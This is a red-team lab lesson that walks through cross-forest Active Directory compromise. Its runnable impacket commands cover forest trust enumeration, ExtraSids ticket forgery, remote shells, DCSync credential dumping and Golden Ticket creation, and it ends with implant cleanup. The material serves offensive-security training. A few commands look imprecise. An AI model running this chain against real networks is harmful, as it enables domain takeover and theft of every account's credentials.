---
title: "Offshore Lab Episode 4 — Multi-Forest Trust Exploitation"
tags: [red-team, offshore, lab, multi-forest, trust-exploitation, SID-history,
  forest-trust, inter-forest-TGT, ExtraSids, T1484.002, T1558.001, ATT&CK,
  subsidiary-domain, trust-transitivity]
module: 08-RedTeam-03
day: 538
related_topics:
  - Offshore Lab Episode 3 (Day 537)
  - SID History and Trust Attacks (Day 516)
  - Offshore Practice Day 1 (Day 539)
  - Cross-Environment Attack Paths (Day 529)
  - Domain Dominance (Day 499)
---

# Day 538 — Offshore Lab Episode 4: Multi-Forest Trust Exploitation

> "Domain admin in forest A is not domain admin in forest B. Most junior
> operators think DA is the finish line. It is not. It is the credential
> that opens the next door. Forest trust relationships are explicitly designed
> to share access — and explicit sharing of access between two security
> boundaries always means there is a path between them. Your job is to find
> what that path allows and walk it all the way to the second forest's DA."
>
> — Ghost

---

## Goals

Enumerate forest trust relationships from a Domain Admin context.
Exploit a two-way forest trust to gain access to the subsidiary forest.
Forge a Kerberos ticket with SID history (ExtraSids) for cross-forest access.
Escalate to Domain Admin in the subsidiary forest.
Understand the limitations of forest trust attacks and when they fail.

**Prerequisites:** Episode 3 complete (DA in parent forest, krbtgt hash captured,
Golden Ticket tested). Two-forest lab environment required.
**Time budget:** 5 hours.

---

## Part 1 — Forest Trust Architecture Recap

```
Active Directory Trust Relationships:

  Same forest — all trusts are automatically transitive (all domains in a
  forest trust each other completely via the root domain)

  Cross-forest trust — explicitly created between two forest root domains
  Types:
    One-way trust:  Forest A → Forest B
      → Forest A users can access resources in Forest B (if explicitly granted)
      → Forest B users cannot access Forest A resources
    Two-way trust:  Forest A ↔ Forest B (bidirectional)
      → Both forests can access each other's resources
      → Both directions are independently exploitable

  Trust transitivity in cross-forest trusts:
    Non-transitive by default
    Forest A ↔ Forest B, Forest B ↔ Forest C does NOT give Forest A → Forest C
    (unlike intra-forest trusts which are always transitive)

Attack surface:
  With DA in Forest A and a two-way trust to Forest B:
  → You can request tickets for resources in Forest B (limited)
  → You can forge tickets with ExtraSids that grant Forest A accounts
    membership in Forest B privileged groups
  → If you can escalate to DA in Forest B:
    → Golden Ticket for Forest B (requires Forest B's krbtgt)
    → DCSync on Forest B DC

Key concept — SID Filtering:
  SID Filtering (also called Quarantine) is a security control that strips
  SID history from cross-forest Kerberos tickets.
  If SID Filtering is enabled on a trust: ExtraSids attacks fail.
  If SID Filtering is disabled (the attack requires it to be off):
    ExtraSids attacks succeed.
  How to check:
    netdom query trust /domain:subsidiary.com /verify
    Get-ADObject -Filter {TrustType -eq ...} | Select SIDFilteringQuarantined
  Most real-world environments: SID Filtering enabled on external trusts.
  Offshore-style lab environments: often disabled for learning purposes.
```

---

## Phase 1 — Trust Enumeration from DA Context (30 min)

```powershell
# From your DA session in corp.local (via C2 or impacket):

# Method 1: nltest (native Windows tool)
nltest /domain_trusts /all_trusts

# Method 2: BloodHound — trust relationships are visualised automatically
# In BloodHound, look for: "Map Domain Trusts" pre-built query
# Edges: TrustedBy, Trusts

# Method 3: PowerShell
Get-ADTrust -Filter *
# Output fields:
#   Direction: BiDirectional | Inbound | Outbound
#   TrustType: Forest | External | ParentChild
#   SIDFilteringQuarantined: True/False  ← critical

# Method 4: impacket from attack host
proxychains impacket-GetADUsers \
    corp.local/administrator:'DA_pass' -dc-ip <CORP_DC> -all |
    grep trust

# What to look for:
# Subsidiary forest DC IP — enumerate its DNS name
# Trust direction (bidirectional = both sides exploitable)
# SIDFilteringQuarantined = False → ExtraSids attack possible
```

### Enumerate the Subsidiary Forest

```bash
# Discover the subsidiary forest's DC IP
# From the trust enumeration, you know the domain name: subsidiary.com
# DNS resolution from the corp.local DC should resolve subsidiary.com DCs

proxychains nslookup -type=SRV \
    _ldap._tcp.dc._msdcs.subsidiary.com <CORP_DC_IP>

# Network scan for the subsidiary forest zone:
proxychains nmap -sT -Pn -p 88,389,445 10.10.50.0/24

# LDAP enum of subsidiary forest using cross-forest credentials
# (you may have cross-forest credentials if accounts are shared — test first)
proxychains ldapsearch -x -H ldap://<SUB_DC_IP> \
    -D "corp.local\\administrator" -w 'DA_pass' \
    -b "DC=subsidiary,DC=com" "(objectClass=user)" sAMAccountName 2>/dev/null

# If LDAP fails with cross-forest creds — you need to forge a ticket:
```

---

## Phase 2 — ExtraSids Attack (Inter-Forest TGT Forgery) (90 min)

### Concept

```
ExtraSids attack (T1484.002 / T1558.001 hybrid):

When a user from corp.local accesses a resource in subsidiary.com, the
ticket flow is:
  1. Corp user's TGT → Corp DC → cross-realm TGT with corp's inter-realm key
  2. Subsidiary DC receives cross-realm TGT → issues TGS for the resource

Normally, the subsidiary DC's SID Filter strips SID History claims from
cross-realm tickets. If SID Filtering is DISABLED:
  → An attacker with corp's krbtgt hash can forge a ticket that includes
    subsidiary.com's Domain Admin SID in the ExtraSids field
  → The subsidiary DC accepts this ticket without verification
  → The forged ticket grants DA-level access to subsidiary.com

What you need:
  - corp.local's krbtgt NTLM hash (from Episode 3 DCSync) ✓
  - corp.local's Domain SID (from DCSync output) ✓
  - subsidiary.com's Domain SID (enumerate from LDAP or SID lookup) ← get this now
  - Enterprise Admins group SID of subsidiary.com (S-1-5-21-<SubSID>-519)
  - SID Filtering disabled on the trust (verify before attempting)
```

### Step-by-Step ExtraSids Exploitation

```bash
# Step 1: Get the subsidiary domain's SID
proxychains impacket-lookupsid \
    corp.local/administrator:'DA_pass'@<SUB_DC_IP> | \
    grep "Domain SID"
# Note: S-1-5-21-XXXXXXXXXX-YYYYYYYYYY-ZZZZZZZZZZ

# Step 2: Build the Enterprise Admins SID for subsidiary.com
# Enterprise Admins RID is always 519
# So: <SUB_DOMAIN_SID>-519
echo "Sub EA SID: S-1-5-21-<SUB_SID>-519"

# Step 3: Forge the inter-realm TGT with ExtraSids
# This creates a TGT for corp.local signed with corp's krbtgt,
# but with subsidiary.com's Enterprise Admins SID in the extra_sids field
proxychains impacket-ticketer \
    -nthash <CORP_KRBTGT_NTLM> \
    -domain-sid <CORP_DOMAIN_SID> \
    -domain corp.local \
    -extra-sid <SUB_DOMAIN_SID>-519 \
    -spn krbtgt/subsidiary.com \
    administrator

# Step 4: Use the forged ticket to get a TGS from the subsidiary DC
export KRB5CCNAME=administrator.ccache

proxychains impacket-getST \
    -k -no-pass corp.local/administrator \
    -spn cifs/sub-dc01.subsidiary.com \
    -dc-ip <SUB_DC_IP>

# Step 5: Access the subsidiary DC with the TGS
export KRB5CCNAME=sub-dc01.subsidiary.com.ccache
proxychains impacket-psexec -k -no-pass \
    corp.local/administrator@sub-dc01.subsidiary.com
```

### Alternative — If Direct Credential Works (Easier Path)

```bash
# Check if corp DA credentials work directly on the subsidiary domain
# (happens when accounts are shared or when there's a local admin account
# with the same password across domains)
proxychains crackmapexec smb <SUB_DC_IP> \
    -u administrator -p 'DA_pass' \
    --no-bruteforce

# If they work: directly access the subsidiary via psexec/wmiexec
proxychains impacket-wmiexec \
    corp.local/administrator:'DA_pass'@<SUB_DC_IP>
```

---

## Phase 3 — Subsidiary Forest Compromise (60 min)

```bash
# Once you have shell on the subsidiary DC (either via ExtraSids or direct creds):

# Step 1: Verify access level
whoami /all         # should show Enterprise Admins or Domain Admins

# Step 2: DCSync on the subsidiary domain
proxychains impacket-secretsdump \
    subsidiary.com/administrator@<SUB_DC_IP> -k -no-pass \
    -just-dc-ntlm \
    -outputfile subsidiary_hashes

# Or with harvested DA credentials:
proxychains impacket-secretsdump \
    'subsidiary.com/administrator:DA_pass'@<SUB_DC_IP> \
    -just-dc-ntlm \
    -outputfile subsidiary_hashes

# Step 3: Generate subsidiary Golden Ticket
grep "krbtgt" subsidiary_hashes.ntds
proxychains impacket-lookupsid \
    subsidiary.com/administrator:'DA_pass'@<SUB_DC_IP> | grep "Domain SID"

proxychains impacket-ticketer \
    -nthash <SUB_KRBTGT_NTLM> \
    -domain-sid <SUB_DOMAIN_SID> \
    -domain subsidiary.com \
    administrator

# Step 4: Access subsidiary crown jewels
export KRB5CCNAME=administrator.ccache
proxychains impacket-wmiexec -k -no-pass \
    subsidiary.com/administrator@<SUB_TARGET_HOST>

# Collect the proof flag:
type C:\Users\Administrator\Desktop\proof.txt
```

---

## Phase 4 — Engagement Cleanup (30 min)

```bash
# Cleanup is non-optional in a real engagement.
# In a lab, practice the full cleanup procedure.

# 1. Remove C2 beacons (terminate in C2 console, delete files)
#    On each compromised host:
rm -f /tmp/.cache/dmz_beacon           # Linux
del C:\Temp\implant.exe                # Windows
del C:\Windows\Temp\implant.exe

# 2. Remove persistence mechanisms (all layers from Day 533)
#    WMI: Remove-WmiObject (all three subscription objects)
#    Scheduled task: Unregister-ScheduledTask
#    Run key: Remove-ItemProperty
#    COM: Remove-Item HKCU:\Software\Classes\CLSID\{...}

# 3. Remove created accounts
Get-ADUser -Filter {SamAccountName -like "FakeComputer*"} | Remove-ADUser
Remove-ADComputer -Identity "FakeComputer$"

# 4. Restore modified attributes
# If you modified msDS-AllowedToActOnBehalfOf:
proxychains impacket-rbcd corp.local/administrator:'pass' \
    -dc-ip <DC_IP> -action remove -delegate-to 'WKS-01$' \
    -delegate-from 'FakeComputer$'

# 5. Remove files from compromised hosts
#    chisel binary, ligolo agent, SharpHound, Mimikatz, winpeas

# 6. Ticket file cleanup on attack host
rm -f *.ccache *.kirbi *.pfx

# 7. Verify cleanup — run BloodHound ingestor again and confirm
#    no new attack paths from your new accounts
```

---

## Episode 4 Completion Checklist

```
Multi-Forest Enumeration:
  ☐ All forest trusts enumerated from corp.local
  ☐ Trust direction and SID filtering status documented per trust
  ☐ Subsidiary domain DC IP discovered

Exploitation:
  ☐ ExtraSids ticket forged (if SID filtering disabled) OR
  ☐ Direct credential reuse achieved
  ☐ Shell on subsidiary.com DC verified

Subsidiary Compromise:
  ☐ DCSync on subsidiary.com — subsidiary_hashes.ntds obtained
  ☐ subsidiary.com's krbtgt hash captured
  ☐ Subsidiary Golden Ticket generated and tested
  ☐ Crown jewel / proof flag collected from subsidiary environment

Evidence:
  ☐ Screenshot: whoami on sub-dc01 showing administrator/DA level
  ☐ Screenshot: proof.txt or equivalent flag in subsidiary forest
  ☐ Screenshot: subsidiary krbtgt hash in DCSync output

Cleanup:
  ☐ All C2 beacons terminated
  ☐ All persistence mechanisms removed
  ☐ All created accounts/computers removed
  ☐ All modified attributes restored
  ☐ Tool files removed from all compromised hosts

Full Offshore Lab Status (Episodes 1–4):
  ☐ External foothold achieved
  ☐ Internal domain compromised (corp.local)
  ☐ Subsidiary forest compromised (subsidiary.com)
  ☐ All proofs collected
  ☐ Environment cleaned up
```

---

## Key Takeaways

1. Forest boundaries are real security boundaries — unlike domain boundaries
   within the same forest, which are mostly administrative. A forest trust does
   not mean complete trust: it means explicitly controlled, audited access.
   The ExtraSids attack exploits the rare case where SID filtering is disabled.
2. SID Filtering is the critical defence against cross-forest attacks. If it is
   enabled (the secure default for external trusts), ExtraSids attacks fail. If
   you are testing an environment and the attack does not work, verify SID
   filtering status before concluding the trust is unexploitable.
3. The inter-realm krbtgt key is what makes cross-forest Kerberos work. When
   you forge a ticket using this key, the subsidiary DC cannot distinguish it
   from a legitimate ticket issued by the corp DC. This is a protocol-level
   weakness, not an implementation bug.
4. Cleanup discipline is the mark of a professional red teamer. A complete
   engagement is not just exploits and flags — it is a demonstration that the
   operator can enter and exit a network without leaving persistent backdoors
   that the blue team (or the next attacker) will find later.
5. The multi-forest attack chain (corp DA → ExtraSids → subsidiary DA) mirrors
   documented APT behaviour. The Nobelium/APT29 campaigns targeting Microsoft's
   partner networks used exactly this trust-pivoting approach across federated
   environments. Understanding the attack at this depth is what makes you
   useful in threat intelligence and incident response, not just offensive ops.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q538.1, Q538.2 …).

---

## Navigation

← Previous: [Day 537 — Offshore Lab Episode 3: Domain Compromise](DAY-0537-Offshore-Lab-Episode-3-Domain-Compromise.md)
→ Next: [Day 539 — Offshore Practice Day 1: Speed Engagement](DAY-0539-Offshore-Practice-Day-1-Speed-Engagement.md)
